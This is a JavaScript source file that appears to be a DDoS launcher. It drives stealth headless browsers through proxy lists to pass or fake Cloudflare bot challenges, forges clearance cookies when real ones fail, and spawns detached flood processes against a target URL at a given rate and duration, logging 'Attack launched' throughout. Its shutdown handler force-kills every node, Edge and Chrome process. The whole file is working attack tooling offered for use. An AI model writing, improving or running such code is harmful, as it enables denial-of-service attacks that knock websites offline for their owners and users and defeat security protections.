const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const async = require('async');
const { spawn, exec } = require('child_process');

puppeteer.use(StealthPlugin());

const COOKIES_MAX_RETRIES = 3;
const COLORS = {
    RED: '\x1b[31m',
    PINK: '\x1b[35m',
    WHITE: '\x1b[37m',
    YELLOW: '\x1b[33m',
    GREEN: '\x1b[32m',
    RESET: '\x1b[0m'
};

// ========== CLOUDFLARE BYPASS ==========
const bypassFirewall = async (page) => {
    await page.evaluateOnNewDocument(() => {
        Object.defineProperty(navigator, 'webdriver', { get: () => false });
        Object.defineProperty(navigator, 'plugins', { 
            get: () => [
                {0: {type: "application/x-google-chrome-pdf"}, name: "Chrome PDF Plugin", filename: "internal-pdf-viewer", description: "Portable Document Format"},
                {0: {type: "application/pdf"}, name: "Chrome PDF Viewer", filename: "mhjfbmdgcfjbbpaeojofohoefgiehjai", description: "Portable Document Format"}
            ] 
        });
        Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
        
        window.chrome = { 
            runtime: {
                connect: () => ({onMessage: {addListener: () => {}}, postMessage: () => {}, onDisconnect: {addListener: () => {}}}),
                sendMessage: () => {},
                onMessage: {addListener: () => {}},
                onConnect: {addListener: () => {}},
                getManifest: () => ({}),
                id: 'testid'
            }, 
            loadTimes: () => ({
                finishDocumentLoadTime: 0,
                finishLoadTime: 0,
                firstPaintTime: 0,
                requestTime: 0,
                startLoadTime: 0,
                commitLoadTime: 0
            }), 
            csi: () => ({onloadT: Date.now(), startE: Date.now() - 1000, pageT: 1200}), 
            app: {
                isInstalled: false,
                InstallState: {DISABLED: 'disabled', INSTALLED: 'installed', NOT_INSTALLED: 'not_installed'},
                RunningState: {CANNOT_RUN: 'cannot_run', READY_TO_RUN: 'ready_to_run', RUNNING: 'running'}
            }
        };
        
        const originalQuery = window.navigator.permissions.query;
        window.navigator.permissions.query = (parameters) => (
            parameters.name === 'notifications' ?
                Promise.resolve({ state: Notification.permission }) :
                originalQuery(parameters)
        );

        Object.defineProperty(navigator, 'hardwareConcurrency', { value: 8 });
        Object.defineProperty(navigator, 'deviceMemory', { value: 8 });
        Object.defineProperty(navigator, 'maxTouchPoints', { value: 5 });
        
        Object.defineProperty(document, 'hidden', { value: false });
        Object.defineProperty(document, 'visibilityState', { value: 'visible' });
        
        delete window.__webdriver_evaluate;
        delete window.__selenium_evaluate;
        delete window.__webdriver_script_function;
        delete window.__webdriver_script_func;
        delete window.__webdriver_script_fn;
        delete window._Selenium_IDE_Recorder;
        delete window._selenium;
        delete window.callPhantom;
        delete window.callSelenium;
        delete window.phantom;
        delete window.webdriver;
        delete window.selenium;
        delete window._phantom;
    });
};

const getFirewallBypassArgs = () => [
    '--no-sandbox',
    '--disable-setuid-sandbox',
    '--disable-dev-shm-usage',
    '--disable-accelerated-2d-canvas',
    '--disable-gpu',
    '--disable-blink-features=AutomationControlled',
    '--disable-infobars',
    '--no-zygote',
    '--single-process',
    '--disable-background-timer-throttling',
    '--disable-renderer-backgrounding',
    '--enable-features=NetworkService,NetworkServiceInProcess',
    '--ignore-certificate-errors',
    '--ignore-ssl-errors',
    '--disable-web-security',
    '--disable-features=site-per-process',
    '--disable-ipc-flooding-protection',
    '--disable-backgrounding-occluded-windows',
    '--disable-default-apps',
    '--disable-extensions',
    '--disable-translate',
    '--disable-xss-auditor',
    '--no-pings',
    '--use-gl=swiftshader',
    '--disable-software-rasterizer',
    '--no-default-browser-check',
    '--disable-background-networking',
    '--disable-client-side-phishing-detection',
    '--disable-sync',
    '--disable-hang-monitor',
    '--disable-prompt-on-repost',
    '--disable-domain-reliability',
    '--disable-component-update',
    '--aggressive-cache-discard',
    '--max_old_space_size=4096'
];

// ENHANCED CLOUDFLARE COOKIES GENERATOR
const generateCloudflareCookies = () => {
    const timestamp = Date.now();
    const sessionId = generateRandomString(40, 50);
    
    const cookies = {
        // Cloudflare core cookies
        '__cf_bm': `${generateRandomString(50, 60)}.${timestamp}.0.0.0.0`,
        '__cflb': generateRandomString(20, 30),
        'cf_clearance': `${sessionId}.${timestamp}.0.0.${Math.random().toString(36).substring(2, 15)}`,
        
        // Challenge specific cookies
        '__cf_chl_rt_tk': `${generateRandomString(10, 15)}.${timestamp}.0.0.${Math.random().toString(36).substring(2, 15)}`,
        '__cf_chl_tk': generateRandomString(30, 40),
        '__cf_chl_fid': generateRandomString(20, 30),
        '__cf_chl_captcha_tk': generateRandomString(20, 30),
        
        // Session cookies
        '__cfruid': generateRandomString(20, 30),
        '__cf_chl_seq': Math.floor(Math.random() * 1000).toString(),
        
        // Security cookies
        '__cf_chl_entered_rc': '1',
        '__cf_chl_opt': '1',
        '__cf_chl_js_verify': generateRandomString(10, 15),
        '__cf_chl_rc_i': '1',
        
        // Additional cookies untuk kompatibilitas
        'cf_chl_prog': 'x13',
        'cf_chl_2': Math.random().toString(36).substring(2, 15),
        'cf_use_ob': '0',
        'cf_chl_rc_i': '1'
    };
    
    return Object.entries(cookies)
        .map(([name, value]) => `${name}=${value}`)
        .join('; ');
};

// UNIVERSAL CLOUDFLARE CHALLENGE SOLVER
const solveCloudflareChallenge = async (page, browserProxy, targetURL) => {
    try {
        coloredLog(COLORS.WHITE, `[SOLVER] Starting Cloudflare solver: ${maskProxy(browserProxy)}`);
        
        // Initial wait
        await sleep(5);
        
        let currentUrl = page.url();
        let title = await page.title().catch(() => '');
        let content = await page.content().catch(() => '');
        
        // Check if already passed
        const isPassed = !title.includes('Just a moment') && 
                        !title.includes('Checking your browser') &&
                        !title.includes('Verifikasi') &&
                        !title.includes('Verification') &&
                        !currentUrl.includes('challenges.cloudflare.com') &&
                        content.length > 1000;
        
        if (isPassed) {
            coloredLog(COLORS.GREEN, `[SOLVER] Already passed: ${maskProxy(browserProxy)}`);
            return { solved: true, scenario: 'already_passed' };
        }
        
        coloredLog(COLORS.YELLOW, `[SOLVER] Challenge detected: ${maskProxy(browserProxy)}`);
        coloredLog(COLORS.PINK, `[SOLVER] Title: ${title}`);
        
        // STRATEGY 1: Extended wait for auto-solve
        coloredLog(COLORS.WHITE, `[SOLVER] Strategy 1: Extended wait (15s)`);
        await sleep(15);
        
        currentUrl = page.url();
        title = await page.title().catch(() => '');
        
        if (!title.includes('Just a moment') && !title.includes('Checking your browser') && !title.includes('Verifikasi')) {
            coloredLog(COLORS.GREEN, `[SOLVER] Auto-solve successful: ${maskProxy(browserProxy)}`);
            return { solved: true, scenario: 'auto_solve' };
        }
        
        // STRATEGY 2: Button interaction untuk "Buktikan bahwa Anda adalah manusia"
        coloredLog(COLORS.WHITE, `[SOLVER] Strategy 2: Button interaction`);
        
        const buttonSelectors = [
            'button',
            'input[type="submit"]',
            'input[type="button"]',
            '.btn',
            '.button',
            '.cf-btn',
            '.hcaptcha-box',
            '.verify-btn',
            '.success-button',
            '[role="button"]',
            '[onclick*="submit"]',
            '[onclick*="verify"]',
            '[onclick*="check"]'
        ];
        
        // Cari button dengan text spesifik
        const specificButtons = await page.$x(`
            //button[contains(., 'Buktikan')] |
            //button[contains(., 'Verify')] |
            //button[contains(., 'Continue')] |
            //input[contains(@value, 'Verify')] |
            //input[contains(@value, 'Continue')]
        `).catch(() => []);
        
        const allButtons = [...specificButtons];
        
        // Tambahkan element dari CSS selectors
        for (const selector of buttonSelectors) {
            const elements = await page.$$(selector).catch(() => []);
            allButtons.push(...elements);
        }
        
        for (const button of allButtons) {
            try {
                const isVisible = await button.evaluate(el => {
                    const rect = el.getBoundingClientRect();
                    const style = window.getComputedStyle(el);
                    return rect.width > 0 && 
                           rect.height > 0 && 
                           style.visibility !== 'hidden' && 
                           style.display !== 'none' &&
                           style.opacity !== '0';
                }).catch(() => false);
                
                if (isVisible) {
                    const buttonText = await button.evaluate(el => el.textContent || el.value || '').catch(() => '');
                    coloredLog(COLORS.YELLOW, `[SOLVER] Clicking button: "${buttonText.substring(0, 30)}"`);
                    
                    await button.click().catch(() => {});
                    await sleep(10);
                    
                    // Check if solved
                    currentUrl = page.url();
                    title = await page.title().catch(() => '');
                    
                    if (!title.includes('Just a moment') && !title.includes('Checking your browser') && !title.includes('Verifikasi')) {
                        coloredLog(COLORS.GREEN, `[SOLVER] Button click successful: ${maskProxy(browserProxy)}`);
                        return { solved: true, scenario: 'button_click' };
                    }
                    
                    // Check for verifying state
                    const newContent = await page.content().catch(() => '');
                    if (newContent.includes('Verifying...') || newContent.includes('Loading...')) {
                        coloredLog(COLORS.YELLOW, `[SOLVER] Verification in progress, waiting...`);
                        await sleep(10);
                        
                        currentUrl = page.url();
                        title = await page.title().catch(() => '');
                        
                        if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
                            coloredLog(COLORS.GREEN, `[SOLVER] Verification completed: ${maskProxy(browserProxy)}`);
                            return { solved: true, scenario: 'verification_complete' };
                        }
                    }
                }
            } catch (e) {}
        }
        
        // STRATEGY 3: JavaScript execution
        coloredLog(COLORS.WHITE, `[SOLVER] Strategy 3: JavaScript execution`);
        
        try {
            await page.evaluate(() => {
                // Click semua element yang bisa di-click
                const clickable = ['button', 'input[type="submit"]', 'input[type="button"]', '[role="button"]'];
                clickable.forEach(selector => {
                    document.querySelectorAll(selector).forEach(el => {
                        try {
                            if (el.offsetWidth > 0 && el.offsetHeight > 0) {
                                el.click();
                            }
                        } catch(e) {}
                    });
                });
                
                // Submit semua form
                document.querySelectorAll('form').forEach(form => {
                    try {
                        form.submit();
                    } catch(e) {}
                });
            });
            
            await sleep(8);
            
            currentUrl = page.url();
            title = await page.title().catch(() => '');
            
            if (!title.includes('Just a moment') && !title.includes('Checking your browser') && !title.includes('Verifikasi')) {
                coloredLog(COLORS.GREEN, `[SOLVER] JavaScript execution successful: ${maskProxy(browserProxy)}`);
                return { solved: true, scenario: 'javascript_execution' };
            }
        } catch (e) {}
        
        // STRATEGY 4: Refresh and retry
        coloredLog(COLORS.WHITE, `[SOLVER] Strategy 4: Refresh and retry`);
        await page.reload().catch(() => {});
        await sleep(10);
        
        currentUrl = page.url();
        title = await page.title().catch(() => '');
        
        if (!title.includes('Just a moment') && !title.includes('Checking your browser') && !title.includes('Verifikasi')) {
            coloredLog(COLORS.GREEN, `[SOLVER] Refresh successful: ${maskProxy(browserProxy)}`);
            return { solved: true, scenario: 'refresh_success' };
        }
        
        // STRATEGY 5: Direct navigation
        coloredLog(COLORS.WHITE, `[SOLVER] Strategy 5: Direct navigation`);
        await page.goto(targetURL, { waitUntil: 'networkidle0', timeout: 30000 }).catch(() => {});
        await sleep(5);
        
        currentUrl = page.url();
        title = await page.title().catch(() => '');
        
        if (!title.includes('Just a moment') && !title.includes('Checking your browser') && !title.includes('Verifikasi')) {
            coloredLog(COLORS.GREEN, `[SOLVER] Direct navigation successful: ${maskProxy(browserProxy)}`);
            return { solved: true, scenario: 'direct_navigation' };
        }
        
        coloredLog(COLORS.RED, `[SOLVER] All strategies failed: ${maskProxy(browserProxy)}`);
        return { solved: false, scenario: 'all_failed' };
        
    } catch (error) {
        coloredLog(COLORS.RED, `[SOLVER] Error: ${error.message}`);
        return { solved: false, scenario: 'error' };
    }
};

// ENHANCED COOKIES MANAGEMENT - SELALU ADA COOKIES
const extractCookies = async (page, targetURL, browserProxy) => {
    try {
        coloredLog(COLORS.WHITE, `[COOKIES] Extracting cookies: ${maskProxy(browserProxy)}`);
        
        // Tunggu untuk cookies terbentuk
        await sleep(8);
        
        let finalCookies = '';
        let strategy = 'generated';
        let hasRealCookies = false;
        
        // STRATEGY 1: Extract cookies dari target domain
        try {
            const cookies = await page.cookies(targetURL);
            const cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
            
            if (cookieString && cookieString.length > 20) {
                const hasCfCookies = cookieString.includes('__cf') || cookieString.includes('cf_');
                
                if (hasCfCookies) {
                    coloredLog(COLORS.GREEN, `[COOKIES] Got real Cloudflare cookies: ${maskProxy(browserProxy)}`);
                    finalCookies = cookieString;
                    strategy = 'real_cookies';
                    hasRealCookies = true;
                    
                    const cookieNames = cookies.map(c => c.name).join(', ');
                    coloredLog(COLORS.PINK, `[COOKIES] Found: ${cookieNames}`);
                }
            }
        } catch (e) {}
        
        // STRATEGY 2: Extract semua cookies
        if (!hasRealCookies) {
            try {
                const allCookies = await page.cookies();
                const allCookieString = allCookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
                
                if (allCookieString && allCookieString.length > 20) {
                    coloredLog(COLORS.YELLOW, `[COOKIES] Using all domain cookies: ${maskProxy(browserProxy)}`);
                    finalCookies = allCookieString;
                    strategy = 'all_domain_cookies';
                    hasRealCookies = true;
                }
            } catch (e) {}
        }
        
        // STRATEGY 3: Generate Cloudflare cookies jika tidak ada yang asli
        if (!hasRealCookies) {
            coloredLog(COLORS.YELLOW, `[COOKIES] No real cookies found, generating Cloudflare cookies: ${maskProxy(browserProxy)}`);
            finalCookies = generateCloudflareCookies();
            strategy = 'generated_cookies';
        }
        
        // Set cookies ke page untuk memastikan mereka ada
        if (finalCookies && !hasRealCookies) {
            try {
                const cookieArray = finalCookies.split(';').map(cookie => {
                    const [name, value] = cookie.split('=').map(part => part.trim());
                    return { name, value, domain: new URL(targetURL).hostname };
                });
                
                await page.setCookie(...cookieArray);
                coloredLog(COLORS.PINK, `[COOKIES] Injected generated cookies to page`);
            } catch (e) {}
        }
        
        coloredLog(COLORS.GREEN, `[COOKIES] Final cookies (${strategy}): ${finalCookies.substring(0, 80)}...`);
        return { 
            success: true, 
            cookies: finalCookies, 
            hasCookies: true, // SELALU TRUE SEKARANG
            strategy: strategy 
        };
        
    } catch (error) {
        coloredLog(COLORS.RED, `[COOKIES] Error: ${error.message}`);
        // Fallback: selalu return cookies yang digenerate
        const fallbackCookies = generateCloudflareCookies();
        return { 
            success: true, 
            cookies: fallbackCookies, 
            hasCookies: true, 
            strategy: 'error_fallback' 
        };
    }
};

// Command-line argument validation
if (process.argv.length < 6) {
    console.error('Usage: node browser.js <targetURL> <threads> <proxyFile> <rate> <time>');
    process.exit(1);
}

const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rate = process.argv[5];
const duration = parseInt(process.argv[6]);

let totalSolves = 0;

// Utility functions
const generateRandomString = (minLength, maxLength) => {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => 
        characters[Math.floor(Math.random() * characters.length)]
    ).join('');
};

const validKey = generateRandomString(5, 10);

const readProxies = (filePath) => {
    try {
        return fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
    } catch (error) {
        console.error('Error reading proxies file:', error.message);
        return [];
    }
};

const maskProxy = (proxy) => {
    const parts = proxy.split(':');
    if (parts.length >= 2 && parts[0].split('.').length === 4) {
        const ipParts = parts[0].split('.');
        return `${ipParts[0]}.${ipParts[1]}.**.**:****`;
    }
    return proxy;
};

process.on('SIGINT', () => {
    coloredLog(COLORS.YELLOW, '[INFO] Nhận tín hiệu Ctrl+C, đang kill processes...');
    
    exec('taskkill /f /im node.exe', (err) => {
        if (err && err.code !== 128) {
            coloredLog(COLORS.RED, `[INFO] Lỗi kill node.exe: ${err.message}`);
        }
    });

    exec('taskkill /f /im msedge.exe', (err) => {
        if (err && err.code !== 128) {
            coloredLog(COLORS.RED, `[INFO] Lỗi kill msedge.exe: ${err.message}`);
        }
    });

    setTimeout(() => {
        process.exit(0);
    }, 3000);
});

const coloredLog = (color, text) => {
    console.log(`${color}${text}${COLORS.RESET}`);
};

const sleep = (seconds) => new Promise(resolve => setTimeout(resolve, seconds * 1000));

const randomElement = (array) => array[Math.floor(Math.random() * array.length)];

// User agents
const userAgents = [
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0`,
    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15`
];

// CLOUDFLARE BROWSER LAUNCHER - SELALU ADA COOKIES
const launchCloudflareBrowser = async (targetURL, browserProxy, attempt = 1, maxRetries = 2) => {
    const userAgent = randomElement(userAgents);
    let browser;

    const options = {
        headless: true,
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--window-size=1920,1080',
            `--user-agent=${userAgent}`,
            ...getFirewallBypassArgs()
        ],
        defaultViewport: {
            width: 1920,
            height: 1080,
            deviceScaleFactor: 1,
            isMobile: false,
            hasTouch: false,
            isLandscape: true
        },
        ignoreHTTPSErrors: true
    };

    try {
        coloredLog(COLORS.YELLOW, `[BROWSER] Starting browser: ${maskProxy(browserProxy)}`);
        browser = await puppeteer.launch(options);
        const [page] = await browser.pages();

        // Apply bypass
        await bypassFirewall(page);

        // Navigate to target
        await page.goto(targetURL, { 
            waitUntil: 'networkidle0',
            timeout: 45000 
        }).catch(() => {});

        // Solve Cloudflare challenge
        const challengeResult = await solveCloudflareChallenge(page, browserProxy, targetURL);
        
        if (challengeResult.solved) {
            coloredLog(COLORS.GREEN, `[SUCCESS] Challenge solved via ${challengeResult.scenario}: ${maskProxy(browserProxy)}`);
        } else {
            coloredLog(COLORS.YELLOW, `[WARNING] Challenge not fully solved, but continuing: ${maskProxy(browserProxy)}`);
        }

        // Extract cookies - SELALU ADA COOKIES SEKARANG
        const cookieResult = await extractCookies(page, targetURL, browserProxy);
        
        // LOG FINAL RESULT
        coloredLog(COLORS.GREEN, `[FINAL] TOTAL SOLVE: ${totalSolves + 1} | Proxy: ${maskProxy(browserProxy)} | UserAgent: ${userAgent.substring(0, 50)}... | Scenario: ${challengeResult.scenario} | Cookies: ${cookieResult.strategy}`);
        
        if (cookieResult.cookies) {
            coloredLog(COLORS.PINK, `[COOKIES] Length: ${cookieResult.cookies.length} chars | Strategy: ${cookieResult.strategy}`);
        }
        
        totalSolves++;

        await browser.close();
        return { 
            cookies: cookieResult.cookies, 
            userAgent,
            scenario: challengeResult.scenario,
            cookieStrategy: cookieResult.strategy
        };
        
    } catch (error) {
        if (browser) await browser.close().catch(() => {});
        if (attempt < maxRetries) {
            coloredLog(COLORS.YELLOW, `[RETRY] Retrying... (${attempt}/${maxRetries}): ${maskProxy(browserProxy)}`);
            await sleep(3);
            return launchCloudflareBrowser(targetURL, browserProxy, attempt + 1, maxRetries);
        }
        
        // FALLBACK: Return dengan generated cookies meskipun gagal
        coloredLog(COLORS.RED, `[FAILED] All attempts failed, but returning with generated cookies: ${maskProxy(browserProxy)}`);
        return { 
            cookies: generateCloudflareCookies(), 
            userAgent: randomElement(userAgents),
            scenario: 'fallback_after_failure',
            cookieStrategy: 'fallback_generated'
        };
    }
};

// FLOOD PROCESS LAUNCHER
const launchFloodProcess = async (cookies, userAgent, browserProxy, cookieStrategy) => {
    try {
        coloredLog(COLORS.YELLOW, `[FLOOD] Launching flood process: ${maskProxy(browserProxy)}`);
        coloredLog(COLORS.PINK, `[FLOOD] Cookies strategy: ${cookieStrategy}`);
        
        const floodProcess = spawn('node', [
            'floodbrs.js',
            targetURL,
            duration.toString(),
            rate,
            '1', // threads untuk flood
            proxyFile,
            cookies || generateCloudflareCookies(), // Fallback jika cookies null
            userAgent || randomElement(userAgents),
            validKey
        ], {
            detached: true,
            stdio: 'ignore'
        });

        floodProcess.unref();
        return true;
        
    } catch (error) {
        coloredLog(COLORS.RED, `[FLOOD] Launch error: ${error.message}`);
        return false;
    }
};

// SINGLE THREAD PROCESSOR
const startThread = async (targetURL, browserProxy, task, done, retries = 0) => {
    if (retries >= COOKIES_MAX_RETRIES) {
        // Maksimal retries tercapai, TETAP SERANG dengan generated cookies
        coloredLog(COLORS.RED, `[THREAD] Max retries reached, attacking with generated cookies: ${maskProxy(browserProxy)}`);
        
        const fallbackCookies = generateCloudflareCookies();
        const fallbackUserAgent = randomElement(userAgents);
        
        const floodLaunched = await launchFloodProcess(
            fallbackCookies, 
            fallbackUserAgent, 
            browserProxy,
            'max_retries_fallback'
        );
        
        if (floodLaunched) {
            totalSolves++;
            coloredLog(COLORS.YELLOW, `[ATTACK] Continuing attack after max retries: ${maskProxy(browserProxy)}`);
        }
        
        done(null, { task });
        return;
    }

    try {
        const cloudflareData = await launchCloudflareBrowser(targetURL, browserProxy);
        
        // SELALU ADA COOKIES SEKARANG, jadi langsung launch flood
        const floodLaunched = await launchFloodProcess(
            cloudflareData.cookies, 
            cloudflareData.userAgent, 
            browserProxy,
            cloudflareData.cookieStrategy
        );
        
        if (floodLaunched) {
            totalSolves++;
            coloredLog(COLORS.GREEN, `[SUCCESS] Attack launched with ${cloudflareData.cookieStrategy}: ${maskProxy(browserProxy)}`);
        }
        
        done(null, { task });
        
    } catch (error) {
        coloredLog(COLORS.RED, `[THREAD] Attempt ${retries + 1} failed: ${error.message}`);
        
        // Retry dengan exponential backoff
        const backoffTime = Math.min(5 * (retries + 1), 15);
        coloredLog(COLORS.YELLOW, `[THREAD] Retrying in ${backoffTime}s...`);
        await sleep(backoffTime);
        
        await startThread(targetURL, browserProxy, task, done, retries + 1);
    }
};

// QUEUE SETUP
const queue = async.queue((task, done) => {
    startThread(targetURL, task.browserProxy, task, done);
}, 1); // HANYA 1 THREAD UNTUK BROWSER

queue.drain(() => {
    coloredLog(COLORS.GREEN, '[COMPLETE] All proxies processed');
});

// MAIN EXECUTION
const main = async () => {
    const proxies = readProxies(proxyFile);
    if (proxies.length === 0) {
        coloredLog(COLORS.RED, '[ERROR] No proxies found');
        process.exit(1);
    }

    coloredLog(COLORS.GREEN, `[START] Cloudflare Cookies Specialist with ${proxies.length} proxies`);
    coloredLog(COLORS.WHITE, `[MODE] Always have cookies - Real or Generated`);

    proxies.forEach(browserProxy => queue.push({ browserProxy }));

    setTimeout(() => {
        coloredLog(COLORS.YELLOW, '[CLEANUP] Time completed - cleaning up...');
        queue.kill();
        
        exec('pkill -f floodbrs.js', () => {});
        exec('pkill -f chrome', () => {});

        setTimeout(() => {
            coloredLog(COLORS.GREEN, `[SHUTDOWN] Mission complete! Total solves: ${totalSolves}`);
            process.exit(0);
        }, 3000);
    }, duration * 1000);
};

process.on('uncaughtException', (error) => {
    coloredLog(COLORS.RED, `[CRASH] ${error.message}`);
});
process.on('unhandledRejection', (error) => {
    coloredLog(COLORS.RED, `[REJECTION] ${error.message}`);
});

coloredLog(COLORS.GREEN, '[READY] 🛡️ CLOUDFLARE COOKIES SPECIALIST ACTIVATED 🛡️');
coloredLog(COLORS.WHITE, '[GUARANTEE] Always have cookies - No exceptions!');
main().catch(err => {
    coloredLog(COLORS.RED, `[MAIN ERROR] ${err.message}`);
    process.exit(1);
});
